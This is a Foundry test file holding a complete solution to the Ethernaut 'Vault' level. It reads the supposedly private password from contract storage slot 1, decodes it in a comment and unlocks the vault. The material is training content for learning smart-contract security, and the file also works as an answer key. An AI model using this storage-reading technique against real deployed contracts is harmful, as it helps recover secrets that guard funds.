// // SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

import "../src/levels/08-Vault/VaultFactory.sol";
import "../src/core/Ethernaut.sol";

contract VaultTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        // Sets an address' balance, (who, newBalance)
        vm.deal(attacker, 1 ether);
    }

    function testVaultHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        VaultFactory vaultFactory = new VaultFactory();
        ethernaut.registerLevel(vaultFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(vaultFactory);
        Vault vaultContract = Vault(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // password variable stored at slot 1
        // vm.load(addr, slot number) --> storage slot
        //
        bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));

        // 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
        // A very strong secret password :) --> web3 type converter
        emit log_bytes(abi.encodePacked(password));

        vaultContract.unlock(password);
        assertEq(vaultContract.locked(), false);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
